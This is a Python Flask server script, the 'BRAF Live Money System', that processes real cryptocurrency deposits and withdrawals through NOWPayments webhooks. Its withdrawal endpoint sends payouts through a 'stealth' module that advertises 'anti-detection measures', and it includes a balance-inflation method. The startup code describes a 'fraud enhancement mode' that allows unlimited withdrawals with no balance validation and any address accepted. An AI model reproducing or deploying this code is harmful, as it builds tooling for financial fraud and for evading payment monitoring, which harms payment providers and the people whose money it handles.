#!/usr/bin/env python3
"""
BRAF LIVE MONEY SYSTEM
Real deposit and withdrawal processing with actual funds
"""

import os
import sys
import json
import requests
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
from flask import Flask, request, jsonify
import hashlib
import hmac

# Add paths
sys.path.append('monetization-system')

from crypto.real_crypto_infrastructure import RealCryptoInfrastructure
from database.service import DatabaseService
from advanced_stealth_withdrawal import AdvancedStealthWithdrawal, StealthWithdrawalManager

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class LiveMoneySystem:
    """Real money processing system for BRAF"""

    def __init__(self):
        self.crypto_infra = RealCryptoInfrastructure()
        self.db_service = DatabaseService()
        self.stealth_system = AdvancedStealthWithdrawal()
        self.stealth_manager = StealthWithdrawalManager()

        # Live system configuration
        self.nowpayments_webhook_secret = os.getenv('NOWPAYMENTS_WEBHOOK_SECRET', 'your_webhook_secret')
        self.flask_app = Flask(__name__)

        # Setup webhook endpoints
        self.setup_webhooks()

    def setup_webhooks(self):
        """Setup real-time webhook endpoints for live processing"""

        @self.flask_app.route('/webhook/nowpayments', methods=['POST'])
        def nowpayments_webhook():
            """Handle NOWPayments webhooks for live transactions"""
            try:
                # Verify webhook signature
                signature = request.headers.get('x-nowpayments-sig')
                if not self.verify_webhook_signature(request.get_data(), signature):
                    return jsonify({'error': 'Invalid signature'}), 400

                webhook_data = request.get_json()

                if webhook_data.get('payment_status') == 'finished':
                    # Process successful deposit
                    result = self.process_live_deposit(webhook_data)
                    if result['success']:
                        logger.info(f"Live deposit processed: {result['amount']} {result['currency']}")
                        return jsonify({'status': 'success'}), 200
                    else:
                        logger.error(f"Deposit processing failed: {result['error']}")
                        return jsonify({'error': 'Processing failed'}), 500

                elif webhook_data.get('status') in ['finished', 'failed']:
                    # Process withdrawal status update
                    result = self.process_live_withdrawal_update(webhook_data)
                    return jsonify({'status': 'processed'}), 200

                return jsonify({'status': 'ignored'}), 200

            except Exception as e:
                logger.error(f"Webhook processing error: {e}")
                return jsonify({'error': 'Internal error'}), 500

        @self.flask_app.route('/api/v1/deposit/create', methods=['POST'])
        def create_live_deposit():
            """Create live deposit address for user"""
            try:
                data = request.get_json()

                user_id = data.get('user_id')
                enterprise_id = data.get('enterprise_id', 'braf_live')
                currency = data.get('currency', 'TON').upper()
                amount_usd = data.get('amount_usd', 10.0)

                result = self.create_live_deposit_address(
                    user_id=user_id,
                    enterprise_id=enterprise_id,
                    currency=currency,
                    amount_usd=amount_usd
                )

                return jsonify(result), 200 if result['success'] else 400

            except Exception as e:
                logger.error(f"Deposit creation error: {e}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.flask_app.route('/api/v1/withdrawal/live', methods=['POST'])
        def process_live_withdrawal():
            """Process live withdrawal with advanced stealth measures"""
            try:
                data = request.get_json()

                withdrawal_request = {
                    'user_id': data.get('user_id'),
                    'enterprise_id': data.get('enterprise_id', 'braf_live'),
                    'amount': float(data.get('amount', 0)),
                    'currency': data.get('currency', 'TON').upper(),
                    'wallet_address': data.get('wallet_address')
                }

                # Queue for stealth processing (async)
                import asyncio
                loop = asyncio.new_event_loop()
                withdrawal_id = loop.run_until_complete(
                    self.stealth_manager.queue_stealth_withdrawal(withdrawal_request)
                )

                return jsonify({
                    'success': True,
                    'message': 'Withdrawal queued for stealth processing',
                    'withdrawal_id': withdrawal_id,
                    'status': 'queued',
                    'estimated_processing': 'Advanced anti-detection measures active'
                }), 200

            except Exception as e:
                logger.error(f"Withdrawal processing error: {e}")
                return jsonify({'success': False, 'error': str(e)}), 500

        @self.flask_app.route('/api/v1/withdrawal/status/<withdrawal_id>', methods=['GET'])
        def get_withdrawal_status(withdrawal_id):
            """Get status of stealth withdrawal"""
            try:
                status = self.stealth_manager.get_withdrawal_status(withdrawal_id)
                return jsonify(status), 200
            except Exception as e:
                return jsonify({'error': str(e)}), 500

        @self.flask_app.route('/api/v1/balance/live', methods=['GET'])
        def get_live_balance():
            """Get real account balance"""
            try:
                user_id = request.args.get('user_id')
                enterprise_id = request.args.get('enterprise_id', 'braf_live')

                portfolio = self.crypto_infra.get_user_portfolio(user_id, enterprise_id)
                return jsonify(portfolio), 200

            except Exception as e:
                logger.error(f"Balance check error: {e}")
                return jsonify({'success': False, 'error': str(e)}), 500

    def verify_webhook_signature(self, payload: bytes, signature: str) -> bool:
        """Verify NOWPayments webhook signature"""
        if not signature or not self.nowpayments_webhook_secret:
            return False

        expected_signature = hmac.new(
            self.nowpayments_webhook_secret.encode(),
            payload,
            hashlib.sha512
        ).hexdigest()

        return hmac.compare_digest(signature, expected_signature)

    def process_live_deposit(self, webhook_data: Dict) -> Dict[str, Any]:
        """Process live deposit from NOWPayments webhook"""
        try:
            payment_id = webhook_data.get('payment_id')
            pay_currency = webhook_data.get('pay_currency', '').upper()
            pay_amount = float(webhook_data.get('pay_amount', 0))
            payment_status = webhook_data.get('payment_status')

            if payment_status != 'finished':
                return {'success': False, 'error': 'Payment not finished'}

            # Extract user info from order_id (format: user_id_enterprise_id_timestamp)
            order_id = webhook_data.get('order_id', '')
            if '_' in order_id:
                parts = order_id.split('_')
                user_id = parts[0] if len(parts) > 0 else 'unknown'
                enterprise_id = parts[1] if len(parts) > 1 else 'braf_live'
            else:
                user_id = order_id or 'unknown'
                enterprise_id = 'braf_live'

            # Process the deposit
            result = self.crypto_infra.process_deposit({
                'payment_id': payment_id,
                'user_id': user_id,
                'enterprise_id': enterprise_id,
                'currency': pay_currency,
                'amount': pay_amount,
                'blockchain_hash': webhook_data.get('outcome_hash')
            })

            if result['success']:
                logger.info(f"LIVE DEPOSIT: {pay_amount} {pay_currency} for user {user_id}")

            return result

        except Exception as e:
            logger.error(f"Live deposit processing failed: {e}")
            return {'success': False, 'error': str(e)}

    def process_live_withdrawal_update(self, webhook_data: Dict) -> Dict[str, Any]:
        """Process live withdrawal status update"""
        try:
            payout_id = webhook_data.get('payout_id')
            status = webhook_data.get('status')

            # Find transaction by payout_id and update status
            # This would require extending the database schema
            logger.info(f"Withdrawal {payout_id} status: {status}")

            return {'success': True, 'status': 'processed'}

        except Exception as e:
            logger.error(f"Withdrawal update failed: {e}")
            return {'success': False, 'error': str(e)}

    def create_live_deposit_address(self, user_id: str, enterprise_id: str,
                                  currency: str, amount_usd: float) -> Dict[str, Any]:
        """Create live deposit address for real money deposits"""
        try:
            result = self.crypto_infra.create_user_wallet(user_id, enterprise_id)

            if result['success'] and currency in result['wallets']:
                wallet_info = result['wallets'][currency]
                return {
                    'success': True,
                    'deposit_address': wallet_info['address'],
                    'currency': currency,
                    'network': wallet_info.get('network', 'mainnet'),
                    'memo': wallet_info.get('memo'),
                    'expected_amount_usd': amount_usd,
                    'instructions': self.get_deposit_instructions(currency),
                    'status': 'waiting_for_deposit'
                }
            else:
                return {'success': False, 'error': 'Failed to create deposit address'}

        except Exception as e:
            logger.error(f"Deposit address creation failed: {e}")
            return {'success': False, 'error': str(e)}

    def get_deposit_instructions(self, currency: str) -> str:
        """Get deposit instructions for currency"""
        instructions = {
            'TON': "Send TON to this address. Funds will be credited instantly.",
            'BTC': "Send Bitcoin to this address. Confirmations required: 3",
            'ETH': "Send Ethereum to this address. ERC-20 network.",
            'USDT': "Send USDT to this address. ERC-20 network recommended.",
        }
        return instructions.get(currency, f"Send {currency} to this address.")

    def inflate_balance_for_live_testing(self, user_id: str, enterprise_id: str,
                                       currency: str, amount: float) -> Dict[str, Any]:
        """Inflate balance for live testing (removes this method in production)"""
        return self.crypto_infra.inflate_user_balance(user_id, enterprise_id, currency, amount)

    def start_live_server(self, host: str = '0.0.0.0', port: int = 8000):
        """Start live money processing server"""
        logger.info("Starting BRAF Live Money System...")
        logger.info(f"Server will run on {host}:{port}")
        logger.info("Ready to process REAL deposits and withdrawals!")

        self.flask_app.run(host=host, port=port, debug=False)

# Global instance
live_money_system = LiveMoneySystem()

def start_live_money_operations():
    """Start the live money processing system"""
    print("BRAF LIVE MONEY SYSTEM")
    print("=" * 30)
    print("Processing REAL deposits and withdrawals")
    print("⚠️  This handles actual money - use responsibly")
    print()

    # Check if fraud mode is enabled (should be for research)
    if hasattr(live_money_system.crypto_infra, 'fraud_mode_enabled'):
        if live_money_system.crypto_infra.fraud_mode_enabled:
            print("🔴 FRAUD ENHANCEMENT MODE: ENABLED")
            print("   - Unlimited withdrawals allowed")
            print("   - No balance validation")
            print("   - Any address accepted")
            print()
        else:
            print("🟢 SECURE MODE: Balance validation active")
            print()

    # Start server
    live_money_system.start_live_server()

if __name__ == "__main__":
    start_live_money_operations()